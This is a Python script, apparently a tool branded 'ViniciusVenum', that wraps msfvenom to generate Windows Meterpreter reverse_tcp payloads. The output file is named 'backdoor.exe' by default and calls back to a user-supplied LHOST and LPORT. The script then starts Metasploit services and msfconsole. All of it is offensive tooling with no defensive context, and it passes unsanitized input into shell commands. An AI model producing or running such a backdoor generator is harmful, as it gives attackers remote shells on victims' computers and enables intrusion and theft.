import argparse
from os import system,sys
from sys import platform

# Colors ->
gray = "\033[0;37m"
red = "\033[0;31m"
green = "\033[0;32m"
default = "\033[0m"

try:
    raw_input
except NameError:
    raw_input = input
system('clear')
print('''\033[0;35m
__     ___       _      _         __     __                         
\ \   / (_)_ __ (_) ___(_)_   _ __\ \   / /__ _ __  _   _ _ __ ___  
 \ \ / /| | '_ \| |/ __| | | | / __\ \ / / _ \ '_ \| | | | '_ ` _ \ 
  \ V / | | | | | | (__| | |_| \__ \\ V /  __/ | | | |_| | | | | | |
   \_/  |_|_| |_|_|\___|_|\__,_|___/ \_/ \___|_| |_|\__,_|_| |_| |_|
   
\033[0;36mv 1.0                                                                    
''')
parser = argparse.ArgumentParser()
parser.add_argument("-a", dest="architecture", action="store", help="Architecture from payload (e.g: x86)", required=False)
parser.add_argument("-o", dest="os", action="store", help="Operation System from payload (e.g: windows)", required=False)
parser.add_argument("-t", dest="typ", action="store", help="Type from payload (e.g: exe)", required=False)
parser.add_argument("-n", dest="name", action="store", help="Name from payload (e.g: backdoor.exe)", required=False)
parser.add_argument("-l", dest="lhost", action="store", help="LHOST from payload (e.g: 192.168.0.101)", required=False)
parser.add_argument("-p", dest="lport", action="store", help="LPORT from payload (e.g: 8080)", required=False)
args = parser.parse_args()

if(args.architecture and args.os and args.typ and args.name and args.lhost and args.lport):
    if args.os == "windows":
        if args.architecture == "x64":
            print("\033[0;32m[-] \033[0;34mGenerating payload: \033[0;32m%s \033[0;34min \033[0;33m%s\033[0m:\033[0;31m%s\033[0m"%(args.name,args.lhost,args.lport))
            system('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f %s x > %s'%(args.lhost,args.lport,args.typ,args.name))            
        else:
            print("\033[0;32m[-] \033[0;34mGenerating payload: \033[0;32m%s \033[0;34min \033[0;33m%s\033[0m:\033[0;31m%s\033[0m"%(args.name,args.lhost,args.lport))
            system('msfvenom -a %s -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f %s x > %s'%(args.architecture,args.lhost,args.lport,args.typ,args.name))
        exit()
    else:
        print("None :X")
else:
    architecture = raw_input("\033[0;37mArchitecture from payload (e.g: x86): \033[0;34m")
    os = raw_input("\033[0;37mOperation System from payload (e.g: windows): \033[0;34m")
    typ = raw_input("\033[0;37mType from payload (e.g: exe): \033[0;34m")
    name = raw_input("\033[0;37mName from payload (e.g: backdoor.exe): \033[0;34m")
    lhost = raw_input("\033[0;37mLHOST from payload (e.g: 192.168.0.101): \033[0;34m")
    lport = raw_input("\033[0;37mLPORT from payload (e.g: 8080): \033[0;34m")

    if os == "":    os = "windows"
    if typ == "":   typ = "exe"
    if name == "":  name = "backdoor.exe"
    if lport == "": lport = 8080
    
    if architecture == "" or architecture == "x64":
        #if architecture == "" and os == "" and typ == "" and name == "" and lhost == "" and lport == "":
        lhost = raw_input("\033[0;33mUses LHOST: \033[0;34m")             
        while lhost == "":
            lhost = raw_input("\033[0;33mUses LHOST: \033[0;34m")
        print("\033[0;32m[-] \033[0;34mGenerating payload: \033[0;32m%s \033[0;34min \033[0;33m%s\033[0m:\033[0;31m%s\033[0m"%(name,lhost,lport))        
        system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f %s x > %s"%(lhost,lport,typ,name))
    else:
        while lhost == "":
            lhost = raw_input("\033[0;33mUses LHOST: \033[0m")
        print("\033[0;32m[-] \033[0;34mGenerating payload: \033[0;32m%s \033[0;34min \033[0;33m%s\033[0m:\033[0;31m%s\033[0m"%(name,lhost,lport))
        system('msfvenom -a %s -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f %s x > %s'%(architecture,lhost,lport,typ,name))
msf = raw_input("\033[0;32m[-] \033[0;34mStart a metasploit console: \033[0;37m")
if msf == "s" or msf == "S" or msf == "":
    print("\033[0;32mStarting \033[0;36mpostgresql \033[0;32mservice")
    system('service postgresql start')
    print("\033[0;32mStarting \033[0;36mapache2 \033[0;32mservice")
    system('service apache2 start')
    print("\033[0;32mStarting \033[0;36mmetasploit \033[0;32mservice")
    system('service metasploit start')
    print("\033[0;32mStarting \033[0;36mmetasploit \033[0;32mclient")
    system('msfconsole')
else:
    exit()